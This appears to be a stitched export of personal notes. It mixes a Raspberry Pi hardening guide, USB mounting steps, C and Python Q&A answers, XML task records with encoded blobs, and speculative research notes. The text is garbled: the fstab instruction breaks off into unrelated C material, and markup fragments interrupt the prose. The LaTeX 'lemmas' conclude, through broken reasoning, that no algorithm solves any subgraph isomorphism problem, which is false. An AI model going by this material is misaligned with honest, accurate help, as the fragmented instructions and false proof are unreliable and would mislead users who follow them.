    Whenever you allow outside access, always remember that you’re poking a hole through whatever protection your firewall provides. Don’t open it up until you're certain it’s secure.

Please confirm and test all settings before exposing your RPi to the world!
Change the pi user password

Before even considering connecting to the outside world, be sure to at least change the pi user password. Anybody attacking your system will quickly realize it's a RPi, and every fresh raspbian install has a pi user with the default password raspberry. Change it now. Log in as the pi user and enter:

passwd  

Change the password to something you’ll remember, but that is not easily guessed. The sad truth is that passwords less than 12 characters aren't very effective these days. Google for recommendations on password complexity.
Create a new user account

If you run a server exposed to the Internet, it will immediately be subject to hundreds of login attempts using well-known user accounts. You'll see attempts made at gaining access using the root user account, but also admin, sales, support and a host of common account names. With the rising popularity of the RPi, the universal (and poorly secured) pi account has been added to this list.

I suggest you don't use the pi user account for remote access at all if you can help it. Most Linux distributions require that you create a new user account with and password during installation. Defaults are just too dangerous. I like to take the same approach on my RPi.

It's important to do this sooner rather than later, and before you do a lot of system customization so you don't have to re-create your setup as the new user.

This only provides a modicum of security since valid usernames can be scraped from emails or guessed, but it does raise the bar for gaining access. Log into your system and enter the following:

sudo adduser &lt;username&gt;  

Where &lt;username&gt; is your chosen name for the new account. adduser will ask you a series of questions about the new user identity. Be sure to create a strong password (see above).

Since we want this new user account to replace the pi' user, we need to allow it the same access. This includes access to sudo for root level access. While still logged in as your original (pi) user, enter the following:

sudo adduser &lt;username&gt; sudo  

This adds your new user to the sudo group which allows running commands as root when necessary. Since we want this command to replace the pi account, it's a good idea to add it to some other groups commonly used on the RPi:

sudo adduser &lt;username&gt; audio  
sudo adduser &lt;username&gt; video  
sudo adduser &lt;username&gt; netdev  

Log out, then log back in using your new user account. Be sure you can do everything with it that you could using the pi account, including running commands with sudo. Make sure to have this working before proceeding.
Defang the pi user account

Now that we’re using another account, it's time to secure the pi user. I prefer to disable the pi user account without deleting it in case I need it later.
Fix pi user sudo access without password

Note: If you're going to disable the pi account in following steps, this step is optional. I like to do it just in case I re-enable pi for some reason down the road.

We're going to force the pi user to enter a password when executing commands with sudo commands just like every other linux distribution does. We need to modify the /etc/sudoers file. The visudo command should be used to edit this file to avoid possible damage.

sudo visudo  

Comment out (or delete) the line that gives 'pi' special treatment.

#pi ALL=(ALL) NOPASSWD: ALL

Next, re-start the sudo system to put these changes into effect.

sudo service sudo restart  

You can test this by logging in as pi and entering a sudo command. You should be prompted for the pi user password.
Disable the pi account

Next, let's disable the pi account so we don't have to worry about unintended access. The account is still there if we need it later for some reason, but can't be used without explicit steps to unlock it. You need to be absolutely sure your other account is working for these steps.

Log in as your non-pi user and lock the pi account to prevent any login access:

sudo passwd --lock pi  

Next, expire the pi account to avoid connecting via any non-login means (e.g. ssh pubkey).

sudo usermod --expiredate 1 pi  

At this point, we've locked the pi user account. If you’re planning on setting up remote access, there are still a lot of things you need to do to secure your system, but by following these steps, you can eliminate the toehold that the default pi user settings might provide an attacker.

Detecting USB hard drive

After you plug in your USB device to your USB port, linux will add new block device into /dev/ directory. At this stage you are not able to use this device as the USB filesystem needs to be mouted before you are able to retrieve any data. To find out what name your block device file have you can run fdisk command:

# fdisk -l 

You will get output similar to this:

Disk /dev/sdb: 60.0 GB, 60060155904 bytes
255 heads, 63 sectors/track, 7301 cylinders
Units = cylinders of 16065 * 512 = 8225280 bytes
Disk identifier: 0x000b2b03

   Device Boot      Start         End      Blocks   Id  System
/dev/sdb1               1        7301    58645251    b  W95 FAT32

3. Creating mount point

Create directory where you want to mount your device:

mkdir /mnt/sdb1 

4. Edit /etc/fstab

To automate this process you can edit /etc/fstab file and add line similar to this:

There are several ways to create an array of strings in C. If all the strings are going to be the same length (or at least have the same maximum length), you simply declare a 2-d array of char and assign as necessary:

   1. A static variable inside a function keeps its value between invocations.
    2. A static global variable or a function is "seen" only in the file it's declared in

(1) is the more foreign topic if you're a newbie, so here's an example:

#include &lt;stdio.h&gt;

void foo()
{
    int a = 10;
    static int sa = 10;

    a += 5;
    sa += 5;

    printf("a = %d, sa = %d\n", a, sa);
}


int main()
{
    int i;

    for (i = 0; i &lt; 10; ++i)
        foo();
}

This prints:

a = 15, sa = 15
a = 15, sa = 20
a = 15, sa = 25
a = 15, sa = 30
a = 15, sa = 35
a = 15, sa = 40
a = 15, sa = 45
a = 15, sa = 50
a = 15, sa = 55
a = 15, sa = 60

This is useful for cases where a function needs to keep some state between invocations, and you don't want to use global variables. Beware, however, this feature should be used very sparingly - it makes your code not thread-safe and harder to understand.

(2) Is used widely as an "access control" feature. If you have a .c file implementing some functionality, it usually exposes only a few "public" functions to users. The rest of its functions should be made static, so that the user won't be able to access them. This is encapsulation, a good practice.

Quoting Wikipedia:

    In the C programming language, static is used with global variables and functions to set their scope to the containing file. In local variables, static is used to store the variable in the statically allocated memory instead of the automatically allocated memory. While the language does not dictate the implementation of either type of memory, statically allocated memory is typically reserved in data segment of the program at compile time, while the automatically allocated memory is normally implemented as a transient call stack.

See here and here for more details.

And to answer your second question, it's not like in C#.

In C++, however, static is also used to define class attributes (shared between all objects of the same class) and methods. In C there are no classes, so this feature is irrelevant.</COMMENTS><CUSTOMCOMMENTS>fwoAAHicfVZLb9s4EN5zgPyHgYsiycY1JL+SNO0C2Zxy3N0CvehCiyOLG4r0kpSdIMh/35mR4kfjFjAoi/xm5psn9VKEVOWFctHIUq6W+Xg2LjRWVVY435rSNyuVeMMqt8yzyeSlqLxLaWHpT1ZUztiiKmsVIqYM7oJR9vb19fTkpfi9WKLDoJIP8Lcpa9TjDOajyehmnmWvxdrg5tE4PS3aMofTk2Klgi7S02Sc0Tqf8kpIWvPxtTxIjB83AhiPBTGeCWR8LRCSlcdMIJNrgUxzgUynAqGVH7NcILOpQGZXApln171teVwJ5CoTyNVEIFdzgZASeXRkrzu21x3dm47uTUf3pqObZ8y3ivmc/ey8PT0BgHwEdxCTSqaEtaLwLSyCoVxoBAVV68pkvINHxFUEkyKBbIuwwLRBdIRc+1IxJI62OmG8p3Rp/ULZnW7Kxp5eE2EQSdEAvLPPpA5SjVAZJpHOImgsrQqo6WSf+Hl+waKMbXwgAVrMkoT9ikyaCp59exbYA4ebhcEhRA81BiSVygE+qWZl8fO+yg/GlbYlr7/EpI0f1X/sn6690WTFn1/0uy87b41LZOgr5NntbrP3ns/iweEOouDyK8z2ZQ52dvurQGqq8wHr+aiHncKPuijcYAiK3y/eZF73ZbuVKTTKuJ9RN+/sUTTh3JCN7BYMfGHucHlpLnaIDkXROGr3W025EdLxIMQSh1nPP58d2aRaPbJ5DDk5hpwcQ06PIafHkLNjyNkx5Dx75y/92ohVayV8pYoYYcMlt1/uDlFT2XrpJ6rJBqVQjvYTpdZpLmTQ3p0l2ChKFomSlR+bKo7gT9xQnwyh9htcYxhSbxCjClVqiUKsfWs1WWFpDQR4hkjcjVtS132iXqMSeSTGZI7Ie2oD58laHVDpT1FVKGRozGoMQsLRH6Lu9OigL8cX8BA7IxsaIaRcSccNVFlijKTapeDt4I3ZCB6kWUn1miM1Kvvm5/5s0CVi2MXpLYbKmvQ8ZMZtbJUlC/i08hxtmSAUbNzAYNUurCkHW6nYRy5QqL7R1AgYE/hKJtoOswtTozT2PSyzI9UqybhhHbCRhBBMJhpp7r0jQMP6u3JAV6pVbK2kk7IJS+819YUiayUexO2v1oun382jWaE26vOPPfnQTcZ7kvfLoJqG4XwntmrJ460fN9vYp/pdkUgKDwJCdyZrNQFi6VfiCRvhJNHAYAucjBEbt1SWe7reWWRtiUcxK9i7SOS9w0qyaOECJ4kGaXTzyI+JioyTwVDVJt/8FD2C7zWXByPfnKf2IN+4XLUppZn4dFtAEn3WjhQTLt5ncpReO4XDX3OLDO9PqWQwrOUqAq2Sougt2cAb8z4xQIXCXy1C0zSUm82W8q+dY3POh0YOt/zpmFsIUuAvJLbH0ky7fDyooX8QoZs33KnY3Yrd9aiR8mnjAfzOSdJI6YaiIn0fkTKv4b+WmkNKVq5gjqw1j5LM+w8HOqgu7i8v94bOriiUjX5bGfT5ZhzVlVXUJCqlYBZtoqSdx1ou97fpx475xb9YUlf2UY2q6QUvxLEGU+11lJq8ZwQ7HHhcdSgpTX84/bgdQ0CLaxqhvQP0ifjb/5ZhdXMA</CUSTOMCOMMENTS></TASK><TASK ID="347" TITLE="http://stackoverflow.com/questions/1641957/is-an-array-name-a-pointer-in-c" REFID="0" COMMENTSTYPE="PLAIN_TEXT" CREATEDBY="RaptorPatrolCore" PRIORITY="5" RISK="0" PERCENTDONE="0" STARTDATE="42592.00000000" STARTDATESTRING="8/10/2016" CREATIONDATE="42592.71438657" CREATIONDATESTRING="8/10/2016 5:08 PM" LASTMOD="42592.71450231" LASTMODSTRING="8/10/2016 5:08 PM" TEXTCOLOR="0" TEXTWEBCOLOR="#000000" PRIORITYCOLOR="15732480" PRIORITYWEBCOLOR="#000FF0"><COMMENTS> 149

An array is an array and a pointer is a pointer, but in most cases array names are converted to pointers. A term often used is that they decay to pointers.

Here is an array:

int a[7];

a contains space for seven integers, and you can put a value in one of them with an assignment, like this:

a[3] = 9;

Here is a pointer:

int *p;

p doesn't contain any spaces for integers, but it can point to a space for an integer. We can, for example, set it to point to one of the places in the array a, such as the first one:

p = &amp;a[0];

What can be confusing is that you can also write this:

p = a;

This does not copy the contents of the array a into the pointer p (whatever that would mean). Instead, the array name a is converted to a pointer to its first element. So that assignment does the same as the previous one.

Now you can use p in a similar way to an array:

p[3] = 17;

The reason that this works is that the array dereferencing operator in C, "[ ]", is defined in terms of pointers. x[y] means: start with the pointer x, step y elements forward after what the pointer points to, and then take whatever is there. Using pointer arithmetic syntax, x[y] can also be written as *(x+y).

For this to work with a normal array, such as our a, the name a in a[3] must first be converted to a pointer (to the first element in a). Then we step 3 elements forward, and take whatever is there. In other words: take the element at position 3 in the array. (Which is the fourth element in the array, since the first one is numbered 0.)

So, in summary, array names in a C program are (in most cases) converted to pointers. One exception is when we use the sizeof operator on an array. If a was converted to a pointer in this contest, sizeof(a) would give the size of a pointer and not of the actual array, which would be rather useless, so in that case a means the array itself.</COMMENTS></TASK></TASK><TASK ID="350" TITLE="WTF hardware limits" REFID="0" COMMENTSTYPE="PLAIN_TEXT" CREATEDBY="RaptorPatrolCore" PRIORITY="10" RISK="0" PERCENTDONE="0" STARTDATE="42592.00000000" STARTDATESTRING="8/10/2016" CREATIONDATE="42592.86686343" CREATIONDATESTRING="8/10/2016 8:48 PM" LASTMOD="42592.88365741" LASTMODSTRING="8/10/2016 9:12 PM" TEXTCOLOR="0" TEXTWEBCOLOR="#000000" PRIORITYCOLOR="255" PRIORITYWEBCOLOR="#FF0000"><COMMENTS>how to get around:

TODO
be able to write to text file
magic is when it attempts to simulate actors and gets y/n then uses that info to make future  decisions

WEIRD IDEA:
if you store into memory the SI for functions of length 20 or less then maybe with the abstraction principle(where abstract ideas are just higher order numbers) you can instantly identify/solve problems by using some kind of binary search

adding an element to the basis VS
powersetting the finite concept space

THEN: I need to map my persistent basis onto these mappings??

^^^^^^^^^^^^^^
this might be better simply because we can always map stuff to some 2^x for some x in N whereas going powersetting through the basis is a special case

given previous data and a function description (either through its partial binary or "abstract partial binary" like words/formulas),
predict the next X outputs
======
2 parts:
A&gt;function that predicts the next Y values
B&gt;function that finds an efficient/complete description
(use repeated application of A to create B?)
======
2 ways:
&gt;if you've seen it before, then just eval what you know
&gt;guess from previous data, then just put it out there 
&gt;(or even say you don't know)
=======
this problem is asking for a logcially consistent (?) portion of the concept space?
=======
take a pair (x,y) of functions and then you guess the next element

-then the guess function is taken into account 
then over a long period of time you get an arbitrarily close simulation
&lt;simple count func????&gt;

http://stackoverflow.com/questions/7186518/function-with-varying-number-of-for-loops-python

This problem can be solved by recursion. I am just writing an algorithm here, since I believe this can be a general problem.

function Recurse (y, number) 
   if (number &gt; 1)
      Recurse ( y, number - 1 )
   else
      for x in range (y)
      whatever()

first pass:
ABCD
suggests a structure:
A&gt;B&gt;C&gt;D
usage????
second pass:
MISSING SYNTAX FUNCTIONS???
&gt;does it need to appeal to external source? aka python eval?
1. suggest a structure
2. suggest instructions??
what about free/bound variables?

usage: to define other functions:
Try composition:
composition only defined for indicator functions[partial binary]

question: what direction do I go for the cross product?[cantor pairing function]

need:
get the argument of a function[comes from the syntax?]
f(x)=x^2    &lt;=&gt; syntax is its own abstraction[the actual object is in there as well as the way to write it and meaning comes from the abitrary assignment between the two]
	free and fixed variables
f(x) VS f(5)
get the address of the function


plan: 
1.define composition on indicator functions
&gt;&gt;need syntax hax. basically syntax functions are another level of abstraction....
2. find the structure that suggests the composition function
&gt;&gt;now that I have seen syntax functions that menas that the structure that suggests the composition is code LOL. that is because if you don't have syntax functions the code for composition will go on infinitely

this process is the basis of the cloning function</COMMENTS><CUSTOMCOMMENTS>GgcAAHiclVVNj9s2EO05QP7D3Jr04Ejy97axsdmihYF0A9TbosWqBShpJLMrkwpJWTYW+987HMpebdJLdSAp8s3wzcwb6TE1roxToazkIW+qOJkmaYFlGaVKtzLX+0Y4v1ELVcXRePyYllo5l9W0iNJSyTot850wFl0E10aK+vunp9evHtPv0goVGuG0gV9lvsMiiWA2Go+Wsyh6Sg8Suwepikna5jG8fpU2whSpO46TiMbZxI+EpDFOFjyRmZ+WDEgSRiRThiQLhpAtT1OGjBcMmcQMmUwYQqOfpjFDphOGTOcMmUWL/m6e5gyZRwyZjxkynzGEnPAUyC4C20Wguwx0l4HuMtCNI8+3tPEMCuHEuwJtbmTjpFYr2AvzoA9AWZT0JpqmlrnwR9YnJaSGxgxKaayDRlh7lWZR2L7+cPNjWNm2qtA6CwKsM23uWoNXPWj1YXWz6nGtFRWu6bn4tZhrVfSO+80Iftlst5vbn2H75+3d9R/w02+3N3ebT7fbi+Wq0GhBOlCIBTjtqaOo/QqPDo2itdWtyXEN4kFAc3I7rQAPou49xCPoWQ9Jh7Pk+UyqcOZTcr682wkyynTroDSI72hFIRwEKTCr0a6HqeOIrzwvErJUCNrt0EDZquCzD/rOnMALXlvpt/vdwQ5oVZ96HwWUJGwSsK+VHji7JytHbQCZVMKc/hoS+dxSON41MP1CGmQjKDRsoNLsk7hBbrS10BhdUNjr+1wof0cjpJGqutz1wrcvQk+5QsdehKnaPSoHuqT8nq3uKSKqW2n0nlH2pJw4rntn5Zvj2/fHvxOg54f3q/4UpC+0Bd0pSjpVQwRXfAsVjcLV2T8UDAOV92voxEKHde1nD+zEydegM9Khl42ggu1RKB/SF5xEJukOqgdJUlaKg8jQdYjsG1ynz8E7kbEC2F0pjzhQwXNI8PsWyjfTt18kqCgMUqIpP/71nKEXbcdjQ5+/KziLtlfRS2X8lxb6Pllxg/SZ3InjCDJBX1tRk5r63YsJFc2HEhRa4wFrrt5zzkf0XDqEeBShiOfmoTdS1uVbwGIa8HwZIjHTXbDYELED+fEZ/ooTI6gIol/+nxtJELkuED5++jgKUNrJMBetJRWUcNItyV9963oCX9+NwYHvjaHjTpK0qGc49ZQIUlV9GhbN7ST3UO5LLIMnn/hLvfNaq2E/BTP6e33zL9HGdqwAAAAA</CUSTOMCOMMENTS><TASK ID="452" TITLE="active time" REFID="0" COMMENTSTYPE="PLAIN_TEXT" CREATEDBY="RaptorPatrolCore" PRIORITY="5" RISK="0" PERCENTDONE="0" STARTDATE="42749.00000000" STARTDATESTRING="1/14/2017" CREATIONDATE="42749.97038194" CREATIONDATESTRING="1/14/2017 11:17 PM" LASTMOD="42749.97069444" LASTMODSTRING="1/14/2017 11:17 PM" TEXTCOLOR="0" TEXTWEBCOLOR="#000000" PRIORITYCOLOR="15732480" PRIORITYWEBCOLOR="#000FF0"><COMMENTS>data in&gt;eval using python&gt;write down result&gt;???</COMMENTS></TASK><TASK ID="455" TITLE="what about syntactical metatheorems" REFID="0" COMMENTSTYPE="PLAIN_TEXT" CREATEDBY="RaptorPatrolCore" PRIORITY="5" RISK="0" PERCENTDONE="0" STARTDATE="42749.00000000" STARTDATESTRING="1/14/2017" CREATIONDATE="42749.97386574" CREATIONDATESTRING="1/14/2017 11:22 PM" LASTMOD="42749.97417824" LASTMODSTRING="1/14/2017 11:22 PM" TEXTCOLOR="0" TEXTWEBCOLOR="#000000" PRIORITYCOLOR="15732480" PRIORITYWEBCOLOR="#000FF0"><COMMENTS>like the third result of g(x)?

then guess that it's in higher powerset:
1. remember that things are shifted by +1
2. Problem statement:
Vision([basis,L,[X]])
and X &gt; |P^(L)(basis^2)|
then iterate(is X in L+1?):
is X in P^(L+1)(basis^2)?
idea: we can check using binary:
len(bin(X)) = X'
max element in P^(L)(basis^2) is Y
then check len(bin(Y)) = Y'
what is difference in length?
X'-Y' = Z
Then the number of powersets difference is

\section{Lemma 1}
Let $G_\Omega$ and $G'_\Omega$ be $\Omega-$functions of a graph or a function.
Define \newline
$SI(G_\Omega,G'_\Omega) := \left\{\phi_1,\phi_2, \ldots, \phi_n \right\} \exists n \in \mathbb{N}$ where $\forall i, \phi_i$ maps $G$ to a subgraph of $G'$ by identifying vertices. 
\newline 
%\newline
%$\phi_\Omega: \rchi_{\phi_{EX}} \rightarrow \phi_{EX}$
%\newline
%$G_\Omega: \rchi_{G_{EX}} \rightarrow G_{EX}$
%\newline
%$G'_\Omega: \rchi_{G'_{EX}} \rightarrow G'_{EX}$
%\newline
Then $\phi_\Omega \not\subset G_{EX} $ and $\phi_\Omega \not\subset G'_{EX} $.
\newline
\textbf{Proof}
\newline
Let $a \in \phi_\Omega$.
Then $a = ( \abs{\phi_{EX}}, b )$, where $ b \in \phi_{EX}$.
Let $c \in G_\Omega$.
Then $c = (d,e)$ and $d \in \rchi_{G_{EX}}$, $ e \in G_{EX}$.
Since $max(\rchi_{G_{EX}}) &lt; \abs{\phi_{EX}}$,
$a \not\in G_{EX} $. Then $\phi_\Omega \not\subset G_{EX} $, and similarly $\phi_\Omega \not\subset G'_{EX} $.
\section{Lemma 2}
\section{Lemma 3}
If algorithm $M$ solves a problem by returning a solution function $\phi$, then $\phi \subset M_{EX}$.
\newline
\textbf{Proof}
\newline
Since $M$ returns $\phi$, $\phi \subset S_i$, where $S_i \in S$. Then if $\bar{\phi} \subset M_\Omega$, $\bar{\phi} \subset M_\Omega$
Define $\bar{\phi} := \left\{ \phi \left\ | \right\ \phi : \rchi_{\phi_{EX}} \ \rightarrow \phi_{EX} \right\}$
Then $\bar{\phi} \subset M_\Omega$
\section{Complexity Application}
Let G, G' be graphs. Assume there exists and algorithm $T$ such that $T$ solves $SI(G_\Omega,G'_\Omega)$. Then look at $SI(G_\Omega,T_\Omega)$. By lemma 1, $\phi_\Omega \not\in T_\Omega$. By lemma 3, since $\phi_\Omega \not\in T_\Omega$, and $\phi_Omega \in SI(G_\Omega, T_\Omega)$, there does not exist a $T$ solves any subgraph isomorphism problems. Similarly, we can construct an $SI_Dec$ such that it is the decision form of subgraph isomorphism. Since the arugment holds, there is no T that solves any subgraph isomorphism decision problem either. </COMMENTS><TASK ID="440" TITLE="nottrue" REFID="0" COMMENTSTYPE="PLAIN_TEXT" CREATEDBY="RaptorPatrolCore" PRIORITY="5" RISK="0" PERCENTDONE="0" STARTDATE="42675.00000000" STARTDATESTRING="11/1/2016" CREATIONDATE="42675.62156250" CREATIONDATESTRING="11/1/2016 2:55 PM" LASTMOD="42675.62162037" LASTMODSTRING="11/1/2016 2:55 PM" TEXTCOLOR="0" TEXTWEBCOLOR="#000000" PRIORITYCOLOR="15732480" PRIORITYWEBCOLOR="#000FF0"><COMMENTS>
\section{Lemma 2}
If $f \in f_{EX}$, then $M_f \in f_{EX}$.
\newline
\textbf{Proof}
\newline
By definition, $f_{EX}$ contains all functions $h$ where $\abs{dom(h)} \leq \abs{dom(f)}$ and $h_{\beta} \subseteq f_{\beta}$. 
Then it suffices to show that $\abs{dom(M_f)} \leq \abs{dom(f)}$ and $M_{f_{\beta}} \subseteq f_{\beta}$. 
Then $\abs{dom(M_f)} \leq \abs{dom(f)}$ by definition, and $M_{f_{\beta}} = \rchi_{dom(f)} \cup f \cup \rchi_{\rchi_{dom(f)} \cup f}$. Then $\rchi_{dom(f)} \cup f \subset f_{EX}$, and $\rchi_{\rchi_{dom(f)} \cup f} \subset f_{EX}$ because </COMMENTS></TASK></TASK><TASK ID="465" TITLE="what is matrix mult in Concept Space?"

These answers are O(n), so a little more code than using mylist.count() but much more efficient as mylist gets longer

If you just want to know the duplicates, use collections.Counter

from collections import Counter
mylist = [20, 30, 25, 20]
[k for k,v in Counter(mylist).items() if v&gt;1]

If you need to know the indices,

from collections import defaultdict
D = defaultdict(list)
for i,item in enumerate(mylist):
    D[item].append(i)
D = {k:v for k,v in D.items() if len(v)&gt;1}
